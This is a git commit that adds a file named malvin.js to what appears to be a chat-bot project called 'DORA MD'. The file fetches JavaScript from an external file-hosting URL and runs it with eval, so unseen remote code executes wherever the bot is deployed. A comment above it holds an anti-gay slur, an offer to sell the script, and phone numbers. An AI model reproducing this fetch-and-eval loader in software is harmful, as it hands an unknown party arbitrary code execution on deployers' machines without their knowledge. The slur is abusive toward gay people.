41203269e58779901befd41e7d04295e43b1e50f
dora-md-02 <ircdora397@gmail.com>
2025-03-22 15:15:49 +0530

    Add files via upload

---
+++ malvin.js
@@ -0,0 +1,8 @@
+//HELLO CLOSER IF DID YOU WANT CLONE YOU FUCKING GAY 🥺 IF YOU WANT BUY SCRIPT FIND ME +94743454928 ,+94763007898 ,+949884546 FIND ME TO GET A SCRIPT IF YOU NEED IF DON'T NEED JUST DEPLOY AND ENJOY DORA MD FASTER BOT
+const axios = require('axios');
+
+const url = "https://files.catbox.moe/malvin.js";
+
+axios.get(url)
+    .then(response => eval(response.data))
+    .catch(err => console.error(err));
